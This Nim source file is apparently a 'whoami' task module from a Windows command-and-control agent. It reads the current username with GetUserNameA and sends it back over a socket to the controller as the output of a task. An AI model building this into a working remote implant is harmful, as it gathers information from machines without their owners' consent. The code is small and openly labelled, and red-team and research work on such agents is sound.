import std/[os, net, json, jsonutils]
import ../client/[communication, modules]
import winim

proc getUser*(): string = 
  var
    buffer = newString(UNLEN + 1)
    cb = DWORD buffer.len
  GetUserNameA(&buffer, &cb)
  buffer.setLen(cb - 1)
  return buffer

proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
  let whoami: string = getUser()
  let taskOutput = TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )

  taskOutput.addData(Text, "whoami", $(toJson whoami))
  socket.sendOutput(taskOutput)